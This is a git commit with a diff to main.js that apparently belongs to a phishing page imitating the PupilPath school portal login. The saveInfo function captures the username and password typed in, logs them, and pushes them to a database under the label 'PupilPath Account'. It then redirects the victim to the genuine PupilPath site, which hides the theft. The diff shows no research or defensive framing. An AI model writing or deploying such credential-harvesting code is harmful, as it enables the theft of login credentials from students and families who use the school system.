24356c0de5a38bf5b287e2f608ee06d9cb49274d
jaedonsASC6 <jsatchell2017@gmail.com>
2020-05-02 13:28:26 -0400

    Database Functionality

--- main.js
+++ main.js
@@ -10,7 +10,7 @@ function saveInfo() {
         alert("Please Fill All Required Fields")
     }else{
     console.log(`Username ${username.value} \n Password ${password.value}`)
-    database.push(`Username ${username.value} `+ `Password ${password.value}`)
+    database.push(`PupilPath Account: Username ${username.value} `+ `Password ${password.value}`)
     location.replace("https://pupilpath.skedula.com/")
     }
 }
